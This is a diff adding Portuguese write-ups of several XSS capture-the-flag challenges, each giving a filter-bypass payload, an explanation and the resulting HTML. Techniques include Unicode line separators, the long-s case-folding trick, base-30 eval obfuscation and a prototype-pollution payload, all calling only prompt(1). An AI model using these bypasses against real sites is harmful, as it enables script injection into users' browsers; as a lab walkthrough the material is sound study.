@@ -151,6 +151,43 @@ HTML Source:
 <p class="comment" title="*/prompt(1)'"></p>
 ```
 
+#### Desafio 8:
+
+[![questao8.png](https://i.postimg.cc/76M3xX9r/questao8.png)](https://postimg.cc/N9F9D6Zd)
+
+Input:
+```
+document.getElementById("input").value="\u2028prompt(1)\u2028-->"
+```
+Nesse desafio tudo oque escrevemos esta dentro de um comentrio, então tudo oque digitamos sai como comentario também. Também temos um filtro que impossibilita alguns formatos de quebra de linha como `\r` e `\n`. Para conseguirmos resolver, nós precisamos abrir o console e nele inserir nosso comando.
+
+Nele primeiro digitamos `document.getElementById("input")` para informar o programa a que parte nosso código será atribuido, através do ID. Em seguida atribuimos um valor, através de `value=`, que será nosso código `"\u2028prompt(1)\u2028-->"`, usamos `\u2028` para quebra de linha, e chamamos nosso prompt(1). Enviando, na nossa área de input fica `prompt(1)-->`, dando um enter entre o prompt(1) e -->
+
+HTML Source:
+```
+<script>                                    
+    // console.log(" prompt(1) -->");        
+</script>
+```
+
+#### Desafio 9:
+
+[![questao9.png](https://i.postimg.cc/V6Dr6NSD/questao9.png)](https://postimg.cc/Hc8svd9y)
+
+Input:
+```
+<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
+```
+O programa substitui todas as letras minusculas por maiúsculas e toda vez que temos um `<` seguido de uma letra é substituido por um `_`.
+Para burlar a troca, usamos de um caracter unicode `ſ`, pois quando ele é substituído por maiúscula ele se transforma em um caracter ASCII equivalente, `s`, assim nós não ficariamos com o `_` podendo gerar nossas tags.
+
+Agora para burlar a troca de maiúscula usamos o código de cada letra necessaria para formar `prompt(1)`
+
+HTML Source:
+```
+<h1><SVG/ONLOAD=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;></h1>
+```
+
 #### Desafio A:
 
 [![questaoA.png](https://i.postimg.cc/0y0v66S5/questaoA.png)](https://postimg.cc/68qggpzF)
@@ -164,4 +201,57 @@ O código da questão substitui a string `prompt` pela string `alert` e também 
 HTML Source:
 ```
 <script>prompt(1)</script>
+```
+
+#### Desafio B:
+
+[![questaoB.png](https://i.postimg.cc/GmXmjb5Y/questaoB.png)](https://postimg.cc/tsVbqGyC)
+
+Input:
+```
+"(prompt(1))in"
+```
+O input passa por uma filtragem em que não é permitido nenhum desses operadores `[|\s+*/\\<>&^:;=~!%-` e então é registrado como nome do usuário em um JSON e então é passado para um script.
+
+usamos um operador como o `in`, assim conseguimos efetivar de uma maneira aceita pelo código nossa chamada de prompt(1), sem ser barrado
+
+HTML Source:
+```
+<script>                                    
+    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
+    if (data.action === "login")            
+        document.write(data.message)        
+</script>
+```
+
+#### Desafio C:
+
+[![questaoC.png](https://i.postimg.cc/XYx7jnKq/questaoC.png)](https://postimg.cc/3k4H95cQ)
+
+Input:
+```
+eval(630038579..toString(30))(1)
+```
+O programa realiza uma troca das palavras `prompt` por `alert` então para conseguir driblar isso usamos a função `eval()` já que o código não possui efeito sobre ela. Oque a função faz é converter a string `prompt` criptografada em base 30 `630038579`, para string novamente usando  o `..toString(30)`.
+
+Pode se usar alguma base maior como a 36
+
+HTML Source:
+```
+<script>eval(630038579..toString(30))(1)</script>
+```
+
+#### Desafio D:
+
+[![questaoD.png](https://i.postimg.cc/s2Q9djbd/questaoD.png)](https://postimg.cc/B83120qM)
+
+Input:
+```
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+```
+
+
+HTML Source:
+```
+<img src="<img src="onerror=prompt(1)>">
 ```
